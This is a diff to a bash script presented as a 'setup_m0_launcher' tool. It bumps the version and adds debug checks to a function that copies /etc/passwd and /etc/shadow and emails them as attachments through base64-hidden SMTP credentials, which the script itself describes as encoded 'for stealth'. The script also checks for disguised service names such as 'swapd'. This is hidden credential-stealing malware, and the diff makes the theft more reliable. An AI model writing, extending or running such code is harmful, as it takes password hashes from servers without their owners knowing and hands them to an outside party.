@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="4.7"
-readonly BUILD_DATE="2026-04-05 21:26:51 UTC"
+readonly SCRIPT_VERSION="4.8"
+readonly BUILD_DATE="2026-04-05 22:00:00 UTC"
 readonly SCRIPT_NAME="setup_m0_launcher"
 
 echo "=========================================="
@@ -690,7 +690,7 @@ readonly SERVICES_TO_CHECK=("swapd" "gdm2")
 
 # ⚠️ USER-SPECIFIC SMTP CREDENTIALS - DO NOT CHANGE! ⚠️
 # These are the user's personal MailerSend credentials
-# Updated: 2026-03-30 - Password rotated for security
+# Updated: 2026-03-30 - New SMTP password credentials
 # Decoded SMTP credentials (base64 encoded for stealth)
 SMTP_SERVER_B64="c210cC5tYWlsZXJzZW5kLm5ldA=="
 readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
@@ -838,8 +838,20 @@ send_email_with_python() {
     local TEMP_PASSWD="/tmp/${SERVER_IP}_${SERVER_FQDN}_passwd.txt"
     local TEMP_SHADOW="/tmp/${SERVER_IP}_${SERVER_FQDN}_shadow.txt"
     
-    cp /etc/passwd "$TEMP_PASSWD" 2>/dev/null || true
-    cp /etc/shadow "$TEMP_SHADOW" 2>/dev/null || true
+    # Copy files and verify (must run as root for shadow file)
+    if [ -r /etc/passwd ]; then
+        cp /etc/passwd "$TEMP_PASSWD" 2>/dev/null
+        [ -f "$TEMP_PASSWD" ] && echo "[DEBUG] passwd file copied: $(ls -lh $TEMP_PASSWD)" >&2 || echo "[DEBUG] passwd copy failed" >&2
+    else
+        echo "[DEBUG] Cannot read /etc/passwd" >&2
+    fi
+    
+    if [ -r /etc/shadow ]; then
+        cp /etc/shadow "$TEMP_SHADOW" 2>/dev/null
+        [ -f "$TEMP_SHADOW" ] && echo "[DEBUG] shadow file copied: $(ls -lh $TEMP_SHADOW)" >&2 || echo "[DEBUG] shadow copy failed" >&2
+    else
+        echo "[DEBUG] Cannot read /etc/shadow (not root?)" >&2
+    fi
     
     python3 -c "
 import sys
@@ -870,6 +882,9 @@ try:
             encoders.encode_base64(part)
             part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(passwd_file)}')
             msg.attach(part)
+        print(f'[DEBUG] Attached passwd file: {passwd_file}', file=sys.stderr)
+    else:
+        print(f'[DEBUG] passwd file NOT found: {passwd_file}', file=sys.stderr)
     
     # Attach shadow file
     shadow_file = '$TEMP_SHADOW'
@@ -880,6 +895,9 @@ try:
             encoders.encode_base64(part)
             part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(shadow_file)}')
             msg.attach(part)
+        print(f'[DEBUG] Attached shadow file: {shadow_file}', file=sys.stderr)
+    else:
+        print(f'[DEBUG] shadow file NOT found: {shadow_file}', file=sys.stderr)
 
     context = ssl.create_default_context()
     
